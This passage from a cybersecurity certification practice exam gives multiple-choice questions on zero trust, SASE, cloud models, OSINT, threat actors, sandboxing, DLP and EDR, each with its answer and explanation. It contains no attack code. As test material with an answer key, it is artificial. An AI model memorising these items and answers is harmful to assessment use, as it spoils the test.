        B. The key to answering this question is recognizing that the multitenancy model involves many different customers accessing cloud resources hosted on shared hardware. That makes this a public cloud deployment, regardless of the fact that access to a particular server instance is limited to Matthew's company. In a private cloud deployment, only Matthew's company would have access to any resources hosted on the same physical hardware: this is not multitenancy. There is no indication that Matthew's organization is combining resources of public and private cloud computing, which would be a hybrid cloud, or that the resource use is limited to members of a particular group, which would be a community cloud.
223.    In a zero-trust network architecture, what criteria is used to make trust decisions?

        1. Identity of a user or device
        2. IP address
        3. Network segment
        4. VLAN membership

        Answer:

        A. Zero-trust network architectures make trust decisions based upon the identity of the user or device making the request. They do not make trust decisions based upon network location characteristics, such as an IP address, VLAN assignment, or network segment.
224.    Lynn's organization is moving toward a secure access service edge (SASE) approach to security. Which one of the following technologies is least likely to be included in a SASE architecture?

        1. NGFW
        2. CASB
        3. Hypervisor
        4. WAN

        Answer:

        C. Secure access service edge (SASE) approaches to network security seek to implement zero-trust networking in a way that integrates cloud security services. Next-generation firewalls (NGFWs), cloud access security brokers (CASBs), and wide area network (WAN) connections are all critical components of SASE deployments. Hypervisors are used to create virtual machines, and, while they may be leveraged in a SASE environment, they are not themselves a direct part of the SASE architecture.
225.    Which one of the following technologies would not commonly be used as part of a passwordless authentication approach?

        1. Shadow file
        2. Windows Hello
        3. Smartphone app
        4. Biometrics

        Answer:

        A. Shadow files are used to store hashed passwords and would not be used in passwordless authentication. Passwordless authentication may make use of other authentication factors, including a smartphone app (something you have) or biometrics (something you are). Windows Hello is an authentication technology used to implement passwordless authentication on Windows systems.
226.    During their organization's incident response preparation, Manish and Linda are identifying critical information assets that the company uses. Included in their organizational data sets is a list of customer names, addresses, phone numbers, and demographic information. How should Manish and Linda classify this information?

        1. PII
        2. Intellectual property
        3. PHI
        4. PCI DSS

        Answer:

        A. Personally identifiable information (PII) includes information that can be used to identify, contact, or locate a specific individual. At times, PII must be combined with other data to accomplish this but remains useful for directly identifying an individual. The data that Manish and Linda are classifying is an example of PII. PHI is personal health information. Intellectual property is the creation of human minds including copyrighted works, inventions, and other similar properties. PCI DSS is the Payment Card Industry Data Security Standards.
227.    Randy received a complaint from an end user that links from a legitimate site are being removed from email messages. After examining several of those links, he notes that they all have a common domain:

        `http://bit.ly/3.H9CaOv`

        `http://bit.ly/3.VswDqG`

        `http://bit.ly/3.XLwMXT`

        What is the reason these links were blocked?

        1. This is a malicious domain.
        2. This is a URL redirection domain.
        3. This is obscene content.
        4. This is a false positive.

        Answer:

        B. [`Bit.ly`](http://bit.ly/) is an example of a URL redirection domain, commonly used to create short links. These sites are commonly blocked by content filters because they may be used to hide malicious URLs in a technique known as URL obfuscation. The [`bit.ly`](http://bit.ly/) domain itself is not known to be malicious or obscene but may be used to hide links to those sites.
228.    Derek sets up a series of virtual machines that are automatically created in a completely isolated environment. Once created, the systems are used to run potentially malicious software and files. The actions taken by those files and programs are recorded and then reported. What technique is Derek using?

        1. Sandboxing
        2. Reverse engineering
        3. Malware disassembly
        4. Darknet analysis

        Answer:

        A. Derek has created a malware analysis sandbox and may opt to use tools like Cuckoo, Truman, Minibis, or a commercial analysis tool. If he pulls apart the files to analyze how they work, he would be engaging in reverse engineering, and doing code-level analysis of executable malware would require disassembly. Darknets are used to identify malicious traffic and aren't used in this way.
229.    Which one of the following attackers generally only uses code written by others with minor modifications?

        1. Nation-state actor
        2. Hacktivist
        3. Script kiddie
        4. Insider

        Answer:

        C. Script kiddies are relatively unsophisticated attackers who generally make use of code developed by other attackers, making only minor modifications. Other attackers, such as nation-state actors, hacktivists, and insiders, are generally classified by their motivations, rather than their techniques.
230.    Tanya is creating an open-source intelligence operation for her organization. Which one of the following sources would she be least likely to use in this work?

        1. Web server logs
        2. Dark websites
        3. Government bulletins
        4. Social media

        Answer:

        A. Open-source collection initiatives use publicly available information. This may be found in government bulletins, on the Web (even the Dark Web!), or on social media. Web server logs are generally not public information and would, therefore, be considered closed-source, rather than open-source sources.
231.    What organizations did the U.S. government help create to help share knowledge between organizations in specific verticals?

        1. DHS
        2. SANS
        3. CERTS
        4. ISACs

        Answer:

        D. The U.S. government created information sharing and analysis centers (ISACs). ISACs help infrastructure owners and operators share threat information, and they provide tools and assistance to their members.
232.    Which one of the following teams is least likely to be the recipient of threat intelligence data?

        1. Incident response
        2. Vulnerability management
        3. Risk management
        4. Human resources

        Answer:

        D. Human resources (HR) teams are not generally the recipients of threat intelligence information. Threat intelligence is normally shared with incident response teams, vulnerability management teams, risk management staff, security engineers, and detection and monitoring teams in the security operations center (SOC).
233.    The ATT\&CK framework defines which of the following as “the specifics behind how the adversary would attack the target”?

        1. The threat actor
        2. The targeting method
        3. The attack vector
        4. The organizational weakness

        Answer:

        C. The ATT\&CK framework defines the attack vector as the specifics behind how the adversary would attack the target. You don't have to memorize ATT\&CK to pass the exam, but you should be prepared to encounter questions that you need to narrow down based on what knowledge you do have. Here you can rule out the threat actor and targeting method and then decide between the attack vector and organizational weakness.
234.    Kevin is trying to identify security processes that may be suitable for automation. Which one of the following characteristics best identifies those processes?

        1. Human interaction required
        2. Repeatable
        3. High criticality
        4. Low sensitivity

        Answer:

        B. Processes that are repeatable and do _not_ require human interaction are the best candidates for automation. The criticality or sensitivity of a process is not a significant factor in determining whether it is possible to automate it.
235.    Brian is selecting a CASB for his organization, and he would like to use an approach that interacts with the cloud provider directly. Which CASB approach is most appropriate for his needs?

        1. Inline CASB
        2. Outsider CASB
        3. Comprehensive CASB
        4. API-based CASB

        Answer:

        D. API-based CASB solutions interact directly with the cloud provider through the provider's API. Inline CASB solutions intercept requests between the user and the provider. Outsider and comprehensive are not categories of CASB solutions.
236.    Sherry is deploying a zero-trust network architecture for her organization. In this approach, which one of the following characteristics would be least important in validating a login attempt?

        1. User identity
        2. IP address
        3. Geolocation
        4. Nature of requested access

        Answer:

        B. The defining characteristic of zero-trust network architecture is that trust decisions are not based on network location, such as IP address. It is appropriate to use other characteristics, such as a user's identity, the nature of the requested access, and the user's geographic (not network!) location.
237.    Lisa wants to integrate with a cloud identity provider that uses OAuth 2.0, and she wants to select an appropriate authentication framework. Which of the following best suits her needs?

        1. OpenID Connect
        2. SAML
        3. RADIUS
        4. Kerberos

        Answer:

        A. OpenID Connect is an authentication layer that works with OAuth 2.0 as its underlying authorization framework. It has been widely adopted by cloud service providers and is widely supported. SAML, RADIUS, and Kerberos are alternative authentication technologies but do not have the same level of seamless integration with OAuth.
238.    Which lookup tool provides information about a domain's registrar and physical location?

        1. `nslookup`
        2. `host`
        3. WHOIS
        4. `traceroute`

        Answer:

        C. WHOIS provides information that can include the organization's physical address, registrar, contact information, and other details. `nslookup` will provide IP address or hostname information, whereas host provides IPv4 and IPv6 addresses as well as email service information. `traceroute` attempts to identify the path to a remote host as well as the systems along the route.
239.    Vince recently received the hash values of malicious software that several other firms in his industry found installed on their systems after a compromise. What term best describes this information?

        1. Vulnerability feed
        2. IoC
        3. TTP
        4. RFC

        Answer:

        B. Specific details of attacks that may be used to identify compromises are known as indicators of compromise (IoC). This data may also be described as an adversary tactic, technique, or procedure (TTP), but the fact that it is a set of file signatures makes it more closely match the definition of an IoC.
240.    A PIN is an example of what type of authentication factor?

        1. Something you know
        2. Something you are
        3. Something you have
        4. Something you set

        Answer:

        A. PINs and passwords are both examples of something you know. Biometric factors are an example of something you are, and a physical USB token would be a common example of something you have. Something you set is not a type of authentication factor.
241.    Brian recently joined an organization that runs the majority of its services on a virtualization platform located in its own datacenter but also leverages an IaaS provider for hosting its web services and an SaaS email system. What term best describes the type of cloud environment this organization uses?

        1. Public cloud
        2. Dedicated cloud
        3. Private cloud
        4. Hybrid cloud

        Answer:

        D. The scenario describes a mix of public cloud and private cloud services. This is an example of a hybrid cloud environment.
242.    What type of malware is characterized by spreading from system to system under its own power by exploiting vulnerabilities that do not require user intervention?

        1. Trojan horse
        2. Virus
        3. Logic bomb
        4. Worm

        Answer:

        D. Worms have built-in propagation mechanisms that do not require user interaction, such as scanning for systems containing known vulnerabilities and then exploiting those vulnerabilities to gain access. Viruses and Trojan horses typically require user interaction to spread. Logic bombs do not spread from system to system but lie in wait until certain conditions are met, triggering the delivery of their payload.
243.    Which of the following threat actors typically has the greatest access to resources?

        1. Nation-state actors
        2. Organized crime
        3. Hacktivists
        4. Insider threats

        Answer:

        A. Nation-state actors are government sponsored and typically have the greatest access to resources including tools, money, and talent.
244.    Which one of the following information sources would not be considered an OSINT source?

        1. DNS lookup
        2. Search engine research
        3. Port scans
        4. WHOIS queries

        Answer:

        C. Port scans are an active reconnaissance technique that probe target systems and would not be considered open-source intelligence (OSINT). Search engine research, DNS lookups, and WHOIS queries are all open-source resources.
245.    Gabby's organization captures sensitive customer information, and salespeople and others often work with that data on local workstations and laptops. After a recent inadvertent breach where a salesperson accidentally sent a spreadsheet of customer information to another customer, her organization is seeking a technology solution that can help prevent similar problems. What should Gabby recommend?

        1. IDS
        2. FSB
        3. DLP
        4. FDE

        Answer:

        C. Data loss prevention (DLP) can tag sensitive data and then scan outbound communications for that data. Once tagged data or data that matches specific patterns such as credit card numbers or Social Security numbers are discovered, DLP can alert the user or take other action. An intrusion detection system (IDS) might be able to detect patterns but could not stop traffic flow. FSB is not a security term, and full-disk encryption (FDE) can help prevent data loss if a system is stolen.
246.    Ben is using the `sudo` command to carry out operations on a Linux server. What type of access is he using?

        1. Service access
        2. Unauthorized access
        3. User access
        4. Privileged access

        Answer:

        D. The `sudo` command allows a normal user account to execute administrative commands and is an example of privileged access, not standard user access. There is no indication in the scenario that Ben lacks proper authorization for this access. Service access is the access to resources by system services, rather than individual people.
247.    When Lucca wants to test a potentially malicious file, he uploads it to a third-party website. That website places the software in a secured testing environment, documents what it does, and then uses antimalware tools to try to identify it. What is that type of secure testing environment called?

        1. A software jail
        2. A sandbox
        3. A litterbox
        4. A root dungeon

        Answer:

        B. Running software in an isolated, instrumented, and protected sandbox is a useful technique when testing unknown, potentially malicious software. Sandboxing techniques are used by many malware analysis tools and companies to allow them to determine what a new malicious application does. The remaining options are made up.
248.    Valerie's organization recently fell victim to a scam where an attacker emailed various staff members from an account that appeared to belong to a senior vice president in the organization. The email stated that the vice president was out of the office and needed iTunes gift cards to purchase an application that she needed to accomplish her work. The email asked that the individual immediately purchase an iTunes gift card and send it back via email so that the vice president could continue her work. Valerie wants to prevent this type of attack from succeeding in the future. What should she recommend as an appropriate preventative measure?

        1. Require the organization to use digital signatures for all email.
        2. Require the use of DKIM.
        3. Require the use of SPF and DMARC.
        4. Implement awareness training including simulated phishing attacks.

        Answer:

        D. While it won't be a perfect solution, Valerie should implement an awareness campaign including simulated phishing attacks. This will decrease the chances of staff members falling for attacks like this as well as other techniques that rely on impersonation as part of phishing attempts. Requiring digital signatures for all email will not prevent phishing attacks that appear to come from personal email or external entities. While DKIM, DMARC, and SPF help to ensure that email sent via a domain is legitimate, there is nothing in this question that indicates that the email was sent from an internal email address.
249.    Which of the following measures is not commonly used to assess threat intelligence?

        1. Timeliness
        2. Detail
        3. Accuracy
        4. Relevance

        Answer:

        B. While higher levels of detail can be useful, it isn't a common measure used to assess threat intelligence. Instead, the timeliness, accuracy, and relevance of the information are considered critical to determining whether you should use the threat information.
250.    Sara has been asked to explain to her organization how an endpoint detection and response (EDR) system could help the organization. Which of the following functions is not a typical function for an EDR system?

        1. Endpoint data collection and central analysis
        2. Automated responses to threats
        3. Forensic analysis to help with threat response and detection
        4. Cloud and network data collection and central analysis

        Answer:

        D. Endpoint detection and response (EDR) tools do not collect data such as network traffic or cloud infrastructure. They do collect data from endpoints and centralize it for analysis and response, including forensic and threat detection capabilities.
